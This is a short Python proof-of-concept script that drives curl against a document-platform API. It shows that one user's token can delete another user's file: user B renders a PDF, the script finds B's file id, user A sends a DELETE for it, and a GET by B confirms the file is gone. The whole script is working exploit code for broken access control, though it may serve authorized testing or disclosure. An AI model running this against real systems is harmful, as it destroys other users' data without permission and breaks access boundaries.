import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
TB=open('/tmp/tok_B').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== STEP 1: B(230) creates a file via docintel renderer ===")
c,b=req('POST','/api/v1/document_intelligence/export/pdf',
        {"htmlContent":"<h1>ZX-BAC-VICTIM</h1>","fileName":f"zx-{tag}-victim"},tok=TB)
print(f"  render -> {c}")
print("=== STEP 2: resolve B's file id ===")
fid=None
# find newest file owned by 230
c,b=req('POST','/api/v1/table/query?entities=file',
        {"ab:query":{"entities":["file"],"filter":{},"include":["file"]}},tok=TB)
try:
    inc=json.loads(b).get('included') or []
    mine=[f for f in inc if (f.get('attributes') or {}).get('creatorUserId')==230]
    mine.sort(key=lambda x:int(x['id']), reverse=True)
    if mine:
        fid=mine[0]['id']
        a=mine[0]['attributes']
        print(f"  newest B-owned file: id={fid} name={a.get('name')} creator={a.get('creatorUserId')}")
except Exception as e: print("  err",e,b[:200])
if fid:
    open('/tmp/victim_fid','w').write(str(fid))
    print("\n=== STEP 3: A(231) DELETES B's file ===")
    c,b=req('DELETE',f'/api/v1/files/{fid}',tok=TA)
    print(f"  A DELETE /files/{fid} -> {c} {b[:200].replace(chr(10),' ')}")
    print("\n=== STEP 4: verify B can no longer access its own file ===")
    c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
    print(f"  B GET -> {c} {b[:220].replace(chr(10),' ')}")
